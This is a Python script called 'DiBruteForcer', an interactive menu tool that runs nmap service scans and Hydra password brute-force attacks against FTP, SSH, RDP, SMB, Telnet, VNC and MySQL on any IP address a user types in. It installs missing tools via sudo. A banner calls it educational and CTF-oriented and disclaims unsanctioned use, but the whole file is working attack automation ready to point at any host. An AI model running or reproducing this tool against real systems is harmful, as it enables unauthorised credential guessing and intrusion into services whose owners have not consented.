#!/usr/bin/env python3
import os
import sys
import subprocess
import shutil

# ANSI Color Codes for Red ASCII & Highlighting
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RESET = "\033[0m"
BOLD = "\033[1m"

def verify_and_install_needed_tools():
    """Checks for essential CTF tools like nmap and hydra, and installs them if missing."""
    print(f"{YELLOW}[*] Verifying required penetration testing tools...{RESET}")
    tools = ["nmap", "hydra"]
    
    for tool in tools:
        if shutil.which(tool) is None:
            print(f"{YELLOW}[!] {tool} not found. Attempting installation...{RESET}")
            try:
                subprocess.run(["sudo", "apt-get", "update"], check=True)
                subprocess.run(["sudo", "apt-get", "install", "-y", tool], check=True)
                print(f"{GREEN}[+] Successfully installed {tool}!{RESET}")
            except subprocess.CalledProcessError:
                print(f"{RED}[-] Failed to install {tool}. Please install it manually.{RESET}")
        else:
            print(f"{GREEN}[+] {tool} is already installed.{RESET}")

def banner():
    print(f"{RED}" + """
             ██                                                                                                             
 █████▒        ██       ██████▒                                 ████████                                                    
 ███████       ██       ███████▓                   ██             ████████                                                    
 ██  ▒██▒               ██   ▒██                   ██             ██                                                          
 ██   ▒██   ████        ██    ██   ██░████  ██    ██ ███████    ░████▒   ██       ░████░    ██░████   ▓████▒   ░████▒    ██░████ 
 ██   ░██   ████        ██   ▒██   ███████  ██    ██ ███████   ░██████▒  ██       ░██████░   ███████   ███████  ░██████▒    ███████ 
 ██    ██     ██        ███████░   ███░     ██    ██   ██     ██▒  ▒██ ███████   ███  ███   ███░      ▓██▒  ▒█  ██▒  ▒██    ███░    
 ██    ██     ██        ███████░   ██       ██    ██   ██     ████████ ███████   ██░  ░██   ██         ██░      ████████    ██      
 ██   ░██     ██        ██   ▒██   ██       ██    ██   ██     ████████ ██        ██    ██   ██         ██        ████████    ██      
 ██   ▒██     ██        ██    ██   ██       ██    ██   ██     ██     ██ ██        ██░  ░██   ██         ██░       ██          ██      
 ██  ▒██▒     ██        ██   ▒██   ██       ██▒  ███   ██░    ███░   ▒█ ██        ███  ███   ██         ▓██▒  ░█  ███░   ▒█   ██      
 ███████   ████████ ████████   ██       ▓███████     █████    ░███████ ██        ░██████░   ██        ███████  ░███████    ██      
 █████▒    ████████ ██████▓    ██        ▓███░██     ░████    ░█████▒  ██         ░████░    ██         ▓████▒   ░█████▒    ██      
                                                                                                                            
______________________________________________________________________________________________________________________________
#					DiBruteForcer Tool For Automated Ports Attacks				    #
# For Educational purpose & pentesting Dont use it against real systems | Version: 1.0 | Developer: Diaa			    #											    #
#															    #
# Unsanctioned use against systems you do not own or have explicit permission to test is prohibited. The developer          #
#  accept no liability for damage or misuse.										    #
#_____________________________________________________________________________________________________________________________#                                                                                                                             
    """ + f"{RESET}")

def port_scan():
    target = input(f"{YELLOW}Enter Target IP: {RESET}")
    print(f"{GREEN}[+] Running Nmap scan on {target}...{RESET}")
    subprocess.run(["nmap", "-sV", "-T4", target])

def ftp_brute_force(target):
    user_file = input(f"{YELLOW}Enter path to username list (e.g., /usr/share/wordlists/usernames.txt): {RESET}")
    pass_file = input(f"{YELLOW}Enter path to password list (e.g., /usr/share/wordlists/rockyou.txt): {RESET}")
    print(f"{GREEN}[+] Launching Hydra FTP Brute Force against {target}...{RESET}")
    subprocess.run(["hydra", "-L", user_file, "-P", pass_file, target, "ftp", "-t", "4"])

def ftp_anonymous(target):
    print(f"{GREEN}[+] Checking for FTP Anonymous Login on {target}...{RESET}")
    subprocess.run(["nmap", "--script", "ftp-anon", target])

def ssh_brute_force(target):
    user = input(f"{YELLOW}Enter username or path to user list (-L): {RESET}")
    pass_file = input(f"{YELLOW}Enter path to password list: {RESET}")
    if "/" in user:
        flag = "-L"
    else:
        flag = "-l"
    print(f"{GREEN}[+] Launching Hydra SSH Brute Force against {target}...{RESET}")
    subprocess.run(["hydra", flag, user, "-P", pass_file, target, "ssh", "-t", "4"])

def rdp_brute_force(target):
    user = input(f"{YELLOW}Enter username: {RESET}")
    pass_file = input(f"{YELLOW}Enter path to password list: {RESET}")
    print(f"{GREEN}[+] Launching Hydra RDP Brute Force against {target}...{RESET}")
    subprocess.run(["hydra", "-l", user, "-P", pass_file, target, "rdp"])

def smb_brute_force(target):
    user = input(f"{YELLOW}Enter username: {RESET}")
    pass_file = input(f"{YELLOW}Enter path to password list: {RESET}")
    print(f"{GREEN}[+] Launching Hydra SMB Brute Force against {target}...{RESET}")
    subprocess.run(["hydra", "-l", user, "-P", pass_file, target, "smb"])

def telnet_brute_force(target):
    user = input(f"{YELLOW}Enter username: {RESET}")
    pass_file = input(f"{YELLOW}Enter path to password list: {RESET}")
    print(f"{GREEN}[+] Launching Hydra Telnet Brute Force against {target}...{RESET}")
    subprocess.run(["hydra", "-l", user, "-P", pass_file, target, "telnet"])

def vnc_brute_force(target):
    pass_file = input(f"{YELLOW}Enter path to password list: {RESET}")
    print(f"{GREEN}[+] Launching Hydra VNC Brute Force against {target}...{RESET}")
    subprocess.run(["hydra", "-P", pass_file, target, "vnc"])

def mysql_brute_force(target):
    user = input(f"{YELLOW}Enter username (default: root): {RESET}") or "root"
    pass_file = input(f"{YELLOW}Enter path to password list: {RESET}")
    print(f"{GREEN}[+] Launching Hydra MySQL Brute Force against {target}...{RESET}")
    subprocess.run(["hydra", "-l", user, "-P", pass_file, target, "mysql"])

def main():
    verify_and_install_needed_tools()
    
    while True:
        banner()
        print(f"{BOLD}Choose Your attack:{RESET}")
        print("0) Port Scanning")
        print("1) FTP Brute Force")
        print("2) FTP Anonymous Login")
        print("3) SSH Brute Force")
        print("4) RDP Brute Force")
        print("5) SMB Brute Force")
        print("6) Telnet Brute Force")
        print("7) VNC Brute Force")
        print("8) MySQL Brute Force")
        print("9) Verify Tools")
        print("10) Install && Update Tools")
        print("11) Exit")
        
        user_input = input(f"\n{RED}> {RESET}")

        if user_input == "0":
            port_scan()
        elif user_input == "1":
            target = input(f"{YELLOW}Enter Target IP: {RESET}")
            ftp_brute_force(target)
        elif user_input == "2":
            target = input(f"{YELLOW}Enter Target IP: {RESET}")
            ftp_anonymous(target)
        elif user_input == "3":
            target = input(f"{YELLOW}Enter Target IP: {RESET}")
            ssh_brute_force(target)
        elif user_input == "4":
            target = input(f"{YELLOW}Enter Target IP: {RESET}")
            rdp_brute_force(target)
        elif user_input == "5":
            target = input(f"{YELLOW}Enter Target IP: {RESET}")
            smb_brute_force(target)
        elif user_input == "6":
            target = input(f"{YELLOW}Enter Target IP: {RESET}")
            telnet_brute_force(target)
        elif user_input == "7":
            target = input(f"{YELLOW}Enter Target IP: {RESET}")
            vnc_brute_force(target)
        elif user_input == "8":
            target = input(f"{YELLOW}Enter Target IP: {RESET}")
            mysql_brute_force(target)
        elif user_input == "9" or user_input == "10":
            verify_and_install_needed_tools()
        elif user_input == "11":
            print(f"{RED}[!] Exiting DiBruteForcer. Good luck with the CTF!{RESET}")
            sys.exit(0)
        else:
            print(f"{RED}[!] Invalid option. Please choose between 0 and 11.{RESET}")
        
        input(f"\n{YELLOW}Press Enter to continue...{RESET}")

if __name__ == "__main__":
    main()
